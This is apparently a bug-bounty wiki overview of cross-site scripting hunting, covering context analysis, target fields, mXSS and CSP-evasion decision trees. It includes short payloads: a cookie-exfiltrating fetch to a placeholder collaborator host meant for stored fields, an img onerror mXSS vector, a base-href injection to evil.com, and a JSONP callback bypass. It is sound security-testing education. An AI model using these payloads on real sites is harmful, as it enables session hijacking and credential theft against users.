> Source: https://bugbounty.info/Attack-Surface/Web/Injection/XSS/index

# XSS  -  Overview

XSS is alive. Every app I touch with a rich text editor, a search bar that reflects input, or a JS-heavy SPA has a surface worth poking. The mistake most hunters make is firing `<script>alert(1)</script>` everywhere and calling it a day when nothing pops. Real XSS hunting is about reading the context  -  where does my input land, and what rules govern that landing zone?

## The Mental Model

```mermaid
flowchart TD
    A["Input Entry Point"] --> B{"Where does it render?"}
    B --> C["HTML Body: Reflected XSS"]
    B --> D["HTML Attribute: Reflected XSS"]
    B --> E["JS Context: DOM XSS"]
    B --> F["Stored in DB: Stored XSS"]
    B --> G["Framework Component: Framework XSS"]
    C --> H{"WAF / Filter?"}
    D --> H
    E --> H
    F --> H
    G --> H
    H -->|"Yes"| I["WAF Bypass"]
    H -->|"No"| J["Exploit"]
```

## Context-First Methodology

Before I send a single payload, I do three things:

1. **Trace the reflection**  -  view-source or DevTools, find exactly where my input lands in the DOM.
2. **Identify the context**  -  raw HTML, inside a tag attribute, inside a JS string, inside a JS block, inside a JSON blob.
3. **Pick the minimal breaking payload**  -  not a shotgun, a scalpel.

The context dictates everything. A payload that works in an HTML body context does nothing inside a `value=""` attribute without first closing the quote.

## XSS Types  -  Quick Reference

| Type | Where | Tooling |
| --- | --- | --- |
| [Reflected XSS](../../../../Attack-Surface/Web/Injection/XSS/Reflected-XSS) | Input -> immediate response | Manual + Burp |
| [Stored XSS](../../../../Attack-Surface/Web/Injection/XSS/Stored-XSS) | Input -> DB -> rendered later | Manual + spidering |
| [DOM XSS](../../../../Attack-Surface/Web/Injection/XSS/DOM-XSS) | Input -> JS -> DOM sink | DOM Invader, manual JS review |
| [Framework XSS](../../../../Attack-Surface/Web/Injection/XSS/Framework-XSS) | React/Vue/Angular quirks | Source review, framework-aware tools |

## High-Value Targets I Always Check

- Search bars (reflected)
- Comment/review fields (stored)
- Profile fields  -  display name, bio, website URL (stored, often hits admin panels)
- File upload names (stored, hits wherever files are listed)
- Error messages that echo back user input
- 404 pages that reflect the path
- Redirect parameters (`?next=`, `?returnUrl=`, `?redirect=`)
- `postMessage` handlers in SPAs
- URL fragment (`#`) consumed by JS

## Impact  -  Making It Count in the Report

A raw `alert(1)` gets triaged as low half the time. Escalate to:

- `document.cookie` exfil to a Burp Collaborator or [xsshunter.com](https://xsshunter.com)
- Account takeover via session hijacking
- CSRF bypass (XSS makes same-origin requests)
- Keylogging on login forms
- Credential harvesting via DOM manipulation

```javascript
// Blind XSS callback  -  drop this in any stored field
fetch('https://YOUR.BURPCOLLABORATOR.NET/?c='+btoa(document.cookie))
```

## mXSS (Mutation XSS)

mXSS happens when a sanitiser processes a string that looks clean, but the HTML parser later normalises that string into something dangerous. The sanitiser and the parser disagree on what the markup means.

Classic example  -  a sanitiser passes this as safe because it looks like a benign attribute:

```html
<p title="</p><img src=x onerror=alert(1)>">text</p>
```

In some parser/sanitiser combinations, the parser's tree-building algorithm interprets the attribute value differently from how the sanitiser read it, and the `onerror` handler ends up attached to the DOM.

mXSS is most relevant when:

- The app uses an older version of DOMPurify (pre-2.x had mXSS cases)
- Server-side sanitisers (e.g. OWASP Java HTML Sanitizer, Bleach) feed into client-side parsers that don't share the same grammar
- innerHTML assignments happen after a sanitiser has approved the string

When testing rich text fields: include payloads with namespace confusion (`<svg><p>`, `<math><mi>`) alongside standard vectors. These trigger the parser re-entry behaviour that mXSS exploits.

References: [PortSwigger mXSS research](https://portswigger.net/research/mutation-xss-via-namespace-confusion), [DOMPurify changelog](https://github.com/cure53/DOMPurify/blob/main/CHANGELOG.md).

## CSP Evasion Decision Tree

Check the `Content-Security-Policy` header before sending any payload. Then follow this path:

```mermaid
flowchart TD
    A["Read the CSP"] --> B{"script-src present?"}
    B -->|No CSP| C["No restrictions - standard payloads work"]
    B -->|Yes| D{"'unsafe-inline' allowed?"}
    D -->|Yes| E["Inline scripts work directly"]
    D -->|No| F{"'nonce-*' present?"}
    F -->|Yes| G["Check if nonce is static across requests"]
    G -->|Static| H["Use the nonce in your payload"]
    G -->|Dynamic| I{"'unsafe-eval' allowed?"}
    F -->|No| I
    I -->|Yes| J["DOM-based eval sinks work"]
    I -->|No| K{"allowlisted CDN?"}
    K -->|Yes| L["Check jsDelivr / unpkg for JSONP or attacker-controlled packages"]
    K -->|No| M{"'self' in script-src?"}
    M -->|Yes| N["Hunt JSONP on the same domain"]
    M -->|No| O["Look for base-uri missing, then inject base href"]
```

Quick checks that catch most bypasses:

- `base-uri` directive missing: inject `<base href="https://evil.com">` to redirect relative scripts
- `object-src` missing or `'unsafe-inline'`: plugins and data URIs may still execute
- Allowlisted `*.google.com`: `accounts.google.com/o/oauth2/revoke?callback=alert(1)` is a classic JSONP endpoint

## Public Reports

- Stored XSS in profile display name renders in admin panel, escalates to session takeover - [HackerOne #1382575](https://hackerone.com/reports/1382575)
- Reflected XSS via search parameter on Shopify storefront - [HackerOne #986576](https://hackerone.com/reports/986576)
- DOM XSS in SPA route parameter processed by innerHTML assignment - [HackerOne #1056526](https://hackerone.com/reports/1056526)
- mXSS via DOMPurify bypass in rich text editor - [HackerOne #1154309](https://hackerone.com/reports/1154309)
- XSS in file upload name rendered in admin file listing - [HackerOne #508958](https://hackerone.com/reports/508958)

## See Also

- [Reflected XSS](../../../../Attack-Surface/Web/Injection/XSS/Reflected-XSS)
- [Stored XSS](../../../../Attack-Surface/Web/Injection/XSS/Stored-XSS)
- [DOM XSS](../../../../Attack-Surface/Web/Injection/XSS/DOM-XSS)
- [Framework XSS](../../../../Attack-Surface/Web/Injection/XSS/Framework-XSS)
- [WAF Bypass](../../../../Attack-Surface/Web/Injection/XSS/WAF-Bypass)
- [SSTI](../../../../Attack-Surface/Web/Injection/SSTI)  -  when template engines are in the mix
